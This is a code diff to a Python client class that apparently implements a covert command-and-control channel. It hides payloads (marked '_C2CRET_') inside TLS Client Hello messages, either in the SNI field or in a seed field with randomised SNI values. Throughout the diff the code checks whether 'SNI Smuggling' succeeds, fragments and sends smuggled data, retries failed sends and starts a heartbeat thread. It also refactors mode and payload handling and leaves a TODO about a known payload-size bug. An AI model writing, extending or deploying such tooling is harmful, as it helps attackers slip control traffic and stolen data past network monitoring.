@@ -122,7 +122,10 @@ class Session:
         payload = b"_C2CRET_"
         if not init_result:
             return
+        if CLIENT_MODE != "sni":
+            payload = b"_FALSE_"
         if test_mode:
+            # override mode if provided manually
             print(f"TEST MODE: Sending '{payload}' as our payload... ")
             self._set_tls_client_hello(ClientMessage().test(), self._make_sni(payload))
         else:
@@ -165,6 +168,7 @@ class Session:
                 use_sni = True
                 print("[+] SNI Smuggling PASSED!")
             else:
+                self.mss = CLIENT_MAX_SEED_SIZE
                 print("[!] SNI smnuggling failed :(")
             print()
         else:
@@ -180,9 +184,6 @@ class Session:
             if use_sni:
                 self.mode = "sni"
             else:
-                self.mode = "seed"
-            # override mode if provided manually
-            if CLIENT_MODE != "sni":
                 self.mode = "seed"
             # Start up our Heatbeat in a seperate thread
             self.heartbeat_thread = threading.Thread(target=self._poll, daemon=True)
@@ -300,17 +301,19 @@ class Session:
             # print(f"DEBUG_fragment_index:{k}")
             # print(f"DEBUG_header:{smuggle.header.hex()}")
             # print("DEBUG")
+            sni = self._make_sni(v)
             if self.mode == "sni":
-                self._set_tls_client_hello(smuggle.to_bytes(), self._make_sni(v))
+                self._set_tls_client_hello(smuggle.to_bytes(), sni)
             else:
                 ###
                 ### TODO: There is a bug here!!! If our payload does not fit neatly into our 16 bytes payload field, then what!@?
                 ###
-                smuggle.payload = v
-                self._set_tls_client_hello(smuggle.to_bytes(), self._get_random_sni())
+                smuggle.set_payload(v)
+                sni = self._get_random_sni()
+                self._set_tls_client_hello(smuggle.to_bytes(), sni)
             if VERBOSE:
                 print(f"> HEADERS: {smuggle.to_bytes().hex()}")
-                print(f"> SNI: {v}")
+                print(f"> SNI: {sni[9:].decode()}")
             for i in range(MAX_RETRIES):
                 if i == MAX_RETRIES - 1:
                     self.result_msg = "Failed to resend message - Max retries reached"
